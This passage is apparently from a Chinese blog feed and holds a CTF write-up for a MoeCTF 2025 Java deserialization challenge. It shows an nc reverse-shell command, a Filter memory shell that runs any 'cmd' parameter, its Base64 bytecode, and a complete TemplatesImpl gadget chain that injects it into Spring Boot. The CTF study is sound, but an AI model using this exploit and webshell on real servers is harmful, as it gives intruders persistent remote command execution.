class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此外，做这种Java反序列化题目尽量让包名环境和题目环境一样，此外还要保证<code>SerializeID</code>相同，就此题而言，还需在<code>DogService</code>类加上</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">988523103989629987L</span>;</span><br></pre></td></tr></table></figure><p>题目给了跳板机，执行反弹shell命令<code>nc 127.0.0.1 4444 -e /bin/sh</code>，监听<code>4444</code>端口，最后在环境变量看到了flag</p><p><img src="/img/post/96a84f43fa3efccab055a29a1ea5d7d8.png" alt="96a84f43fa3efccab055a29a1ea5d7d8"></p><br/><h1 id="MoeCTF-2025-附加挑战"><a href="#MoeCTF-2025-附加挑战" class="headerlink" title="[MoeCTF 2025]附加挑战"></a>[MoeCTF 2025]附加挑战</h1><p>本题为<code>第二十三章 幻境迷心·皇陨星沉(大结局)</code>的附加题，这一题平台不再提供跳板机用于反弹shell，所以我们需要注入内存马回显，对附件解包可以发现题目环境是SpringBoot，官方Wp曾尝试使用动态编译注入Interceptor拦截器内存马，但是该方式过于复杂，我想到SpringBoot其实内嵌了一个Tomcat服务器，便想着注入一个Filter内存马</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先，由前面的题目可以知道我们可以利用<code>HashSet</code>的<code>readObject()</code>方法触发<code>Dog</code>的<code>hashCode()</code>方法，该方法会调用一次<code>wagTail()</code>方法，我们可以通过控制<code>Dog</code>的属性利用<code>wagTail()</code>方法进行一次任意命令执行</p><p>跟过CC链就会知道，通过<code>TemplatesImpl</code>类的<code>newTransformer()</code>方法可以进行一次动态类加载，因此我们尝试利用这一思路注入，问题是注入一个什么类？在该类被加载时，需要自动获取<code>StandardContext</code>，并将恶意Filter加载出来并注册进去</p><p>所以就有了大体思路：构建恶意Filter-&gt;获取<code>StandardContext</code>并注册内存马-&gt;将上步的逻辑写入被<code>newTransformer()</code>方法加载的类的静态代码块-&gt;通过<code>newTransformer()</code>加载恶意类</p><h2 id="构建Exp"><a href="#构建Exp" class="headerlink" title="构建Exp"></a>构建Exp</h2><p>首先是Filter内存马，这一步与所有注入Filter内存马的过程几乎一样</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            ProcessBuilder processBuilder;</span><br><span class="line">            processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    output.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">            res.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">            res.getWriter().println(output);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            chain.doFilter(req, res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是构建恶意被加载类，我们需要在该类的静态代码块执行过程中获取<code>ShellFilter</code>实例，可以先把<code>ShellFilter</code>转换为字节码保存在静态代码块逻辑中，在执行时再加载获取实例，下面是导出<code>ShellFilter</code>字节码的逻辑</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dump</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, IOException, CannotCompileException &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;com.example.demo.Dog.ShellFIlter&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="type">String</span> <span class="variable">encode</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(bytes);</span><br><span class="line">        System.out.println(encode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取字节码后，开始构建恶意被加载类，首先是要获取<code>StandardContext</code>，在SpringBoot获取<code>StandardContext</code>与纯Tomcat环境略有不同，Spring Boot 并没有直接暴露 Tomcat 的原生对象，而是将其进行了多层次的封装，这本质是一个抽丝剥茧的过程，我感觉AI讲的比我更好就直接搬上来罢</p><p><img src="/img/post/image-20260120142506438.png" alt="image-20260120142506438"></p><p>具体反映到代码上就是以下的过程</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; contextHolderClass = Class.forName(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRequestAttributesMethod</span> <span class="operator">=</span> contextHolderClass.getMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">attributes</span> <span class="operator">=</span> getRequestAttributesMethod.invoke(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; requestAttributesClass = Class.forName(<span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRequestMethod</span> <span class="operator">=</span> requestAttributesClass.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line"><span class="type">ServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (ServletRequest) getRequestMethod.invoke(attributes);</span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">applicationContext</span> <span class="operator">=</span> contextField.get(servletContext);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">stdContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdContextField.get(applicationContext);</span><br></pre></td></tr></table></figure><p>对比一下正常Tomcat获取<code>StandardContext</code>的过程</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br></pre></td></tr></table></figure><p>其实就是我们无法直接获取<code>request</code>，在SpringBoot中，<code>request</code>被封装为<code>ServletRequestAttributes</code>的一个字段，<code>ServletRequestAttributes</code>可以通过调用<code>RequestContextHolder</code>的<code>getRequestAttributes()</code>方法获取，这不代表<code>ServletRequestAttributes</code>被包装进了<code>RequestContextHolder</code>，而是因为<code>RequestContextHolder</code>的特殊性，<code>getRequestAttributes()</code>返回的是当前线程的<code>ServletRequestAttributes</code>而不是一个简单的、不变的字段，这也是为什么不直接获取<code>ServletRequestAttributes</code>反射调用<code>getRequest()</code>，因为这样根本无法保证获取到的<code>request</code>对象是从哪来的</p><p>所以完整的恶意被加载类，该类为了契合TemplatesImpl的要求需要继承<code>AbstractTranslate</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectClass</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Class&lt;?&gt; contextHolderClass = Class.forName(<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getRequestAttributesMethod</span> <span class="operator">=</span> contextHolderClass.getMethod(<span class="string">&quot;getRequestAttributes&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">attributes</span> <span class="operator">=</span> getRequestAttributesMethod.invoke(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">            Class&lt;?&gt; requestAttributesClass = Class.forName(<span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">getRequestMethod</span> <span class="operator">=</span> requestAttributesClass.getMethod(<span class="string">&quot;getRequest&quot;</span>);</span><br><span class="line">            <span class="type">ServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (ServletRequest) getRequestMethod.invoke(attributes);</span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">applicationContext</span> <span class="operator">=</span> contextField.get(servletContext);</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">stdContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            stdContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">sourceCode</span> <span class="operator">=</span> <span class="string">&quot;yv66vgAAADQAiwoAHQBPCABACwBQAFEHAFIKAAQATwcAUwcAVAgAVQgAVgoABgBXCgAGAFgHAFkHAFoKAFsAXAoADQBdCgAMAF4KAAwAXwoABABgCABhBwBiBwBjCgAVAGQIAGULAGYAZwsAZgBoCgBpAGoLAGsAbAcAbQcAbgcAbwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAiTGNvbS9leGFtcGxlL2RlbW8vRG9nL1NoZWxsRmlsdGVyOwEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEACkV4Y2VwdGlvbnMHAHABAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAdwcm9jZXNzAQATTGphdmEvbGFuZy9Qcm9jZXNzOwEABnJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBABJMamF2YS9sYW5nL1N0cmluZzsBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQAGb3V0cHV0AQAZTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEADnByb2Nlc3NCdWlsZGVyAQAaTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAANyZXEBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAANyZXMBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQAFY2hhaW4BABtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjsBAANjbWQBAA1TdGFja01hcFRhYmxlBwBtBwBxBwByBwBzBwBUBwBSBwBTBwB0BwBZBwBiAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBABBTaGVsbEZpbHRlci5qYXZhDAAfACAHAHEMAHUAdgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEABy9iaW4vc2gBAAItYwwAHwB3DAB4AHkBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgcAdAwAegB7DAAfAHwMAB8AfQwAfgB/DACAAIEBAAEKAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAfAIIBABd0ZXh0L2h0bWw7Y2hhcnNldD1VVEYtOAcAcgwAgwCEDACFAIYHAIcMAIgAiQcAcwwALACKAQAgY29tL2V4YW1wbGUvZGVtby9Eb2cvU2hlbGxGaWx0ZXIBABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQARamF2YS9sYW5nL1Byb2Nlc3MBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgEADnNldENvbnRlbnRUeXBlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL09iamVjdDspVgEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYAIQAcAB0AAQAeAAAABAABAB8AIAABACEAAAAvAAEAAQAAAAUqtwABsQAAAAIAIgAAAAYAAQAAAAgAIwAAAAwAAQAAAAUAJAAlAAAAAQAmACcAAgAhAAAANQAAAAIAAAABsQAAAAIAIgAAAAYAAQAAAAwAIwAAABYAAgAAAAEAJAAlAAAAAAABACgAKQABACoAAAAEAAEAKwABACwALQACACEAAAGhAAYACgAAAJkrEgK5AAMCADoEGQTGAIS7AARZtwAFOgW7AAZZBr0AB1kDEghTWQQSCVNZBRkEU7cACjoGGQa2AAs6B7sADFm7AA1ZGQe2AA63AA+3ABA6CBkItgARWToJxgATGQUZCbYAEhITtgASV6f/6KcADzoHuwAVWRkHtwAWvywSF7kAGAIALLkAGQEAGQW2ABqnAAstKyy5ABsDALEAAQA0AGsAbgAUAAMAIgAAAEIAEAAAABAACgARAA8AEgAYABQANAAWADsAFwBQABkAWwAaAGsAHgBuABwAcAAdAHoAHwCCACAAjQAhAJAAIgCYACQAIwAAAHAACwA7ADAALgAvAAcAUAAbADAAMQAIAFgAEwAyADMACQBwAAoANAA1AAcAGAB1ADYANwAFADQAWQA4ADkABgAAAJkAJAAlAAAAAACZADoAOwABAAAAmQA8AD0AAgAAAJkAPgA/AAMACgCPAEAAMwAEAEEAAAAwAAb/AFAACQcAQgcAQwcARAcARQcARgcARwcASAcASQcASgAA+QAaQgcASwv5ABUHACoAAAAGAAIAFAArAAEATAAgAAEAIQAAACsAAAABAAAAAbEAAAACACIAAAAGAAEAAAApACMAAAAMAAEAAAABACQAJQAAAAEATQAAAAIATg==&quot;</span>;</span><br><span class="line">            <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(sourceCode);</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">            method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Class&lt;?&gt; clazz = (Class&lt;?&gt;) method.invoke(classLoader, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">            <span class="type">Filter</span> <span class="variable">filterShell</span> <span class="operator">=</span> (Filter) clazz.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">            filterDef.setFilterName(<span class="string">&quot;ShellFilter&quot;</span>);</span><br><span class="line">            filterDef.setFilter(filterShell);</span><br><span class="line">            filterDef.setFilterClass(filterShell.getClass().getName());</span><br><span class="line">            standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">            Constructor&lt;?&gt; constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">            filterMap.setFilterName(<span class="string">&quot;ShellFilter&quot;</span>);</span><br><span class="line">            filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">            standardContext.addFilterMap(filterMap);</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">            filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Map&lt;String, ApplicationFilterConfig&gt; filterConfigs = (Map&lt;String, ApplicationFilterConfig&gt;) filterConfigsField.get(standardContext);</span><br><span class="line">            filterConfigs.put(<span class="string">&quot;ShellFilter&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是完整的Exp</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExpForMemShell</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] shell = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\leyi\\IntelliJTest\\serialize\\Moeserialize\\out\\production\\Moeserialize\\com\\example\\demo\\Dog\\InjectClass.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class&lt;?&gt; clazz = templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;Shell&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shell&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Dog</span> <span class="variable">EvilDog</span> <span class="operator">=</span> setDogFields(templates, <span class="string">&quot;getClass&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        HashSet&lt;Dog&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        set.add(EvilDog);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; dogClass = EvilDog.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">objects</span> <span class="operator">=</span> dogClass.getDeclaredField(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        objects.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        objects.set(EvilDog, templates);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">methodName</span> <span class="operator">=</span> dogClass.getDeclaredField(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">        methodName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        methodName.set(EvilDog, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        serialize(set);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Dog <span class="title function_">setDogFields</span><span class="params">(Object object,String methodName,Class&lt;?&gt;[] paramTypes,Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">return</span> Exp.setDogFields(object, methodName, paramTypes, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;moeSerialForShell.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">        <span class="type">byte</span>[] fileBytes = Files.readAllBytes(Paths.get(<span class="string">&quot;moeSerialForShell.ser&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64Encoded</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(fileBytes);</span><br><span class="line">        System.out.println(base64Encoded);</span><br><span class="line">        Files.write(Paths.get(<span class="string">&quot;moeSerialForShell.txt&quot;</span>), base64Encoded.getBytes());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将得到的payload在本地测试成功，控制台打印了<code>success</code>字样</p><p><img src="/img/post/image-20260120154543682.png" alt="image-20260120154543682"></p><p>靶机注入内存马，flag在环境变量里</p><p><img src="/img/post/image-20260120154728056.png" alt="image-20260120154728056"></p><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>很奇怪，题目给的jar包本地运行，上传文件居然会直接把数据用GET请求发送，这会触发8KB的默认数据上限，后面尝试自己在IDEA上写一个一样的环境运行，这样可以更好地查看报错信息。把源码复制上去，发现<code>DogService</code>类产生了报错</p><p><img src="/img/post/image-20260120153801060.png" alt="image-20260120153801060"></p><p><code>readObject()</code>方法返回一个Object对象，虽然这里强转成了集合类型，但是还是会报错，这里只允许让<code>dog</code>的声明类型为Object，所以我在复原题目环境的时候又稍微修改了一下</p><p><img src="/img/post/image-20260120154108880.png" alt="image-20260120154108880"></p><p>后面就是修改启动类配置，主要是修复了请求数据上限和<code>index.html</code>的路径</p><p><img src="/img/post/image-20260120154247466.png" alt="image-20260120154247466"></p><p>这道附加题也是折腾了几天，用官方的动态类编译思路不仅麻烦，还总是做不出来的，现在看还是Filter内存马好用，还方便</p><br/>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JNDI注入</title>
      <link href="/2026/01/18/JNDI%E6%B3%A8%E5%85%A5/"/>
      <url>/2026/01/18/JNDI%E6%B3%A8%E5%85%A5/</url>
      
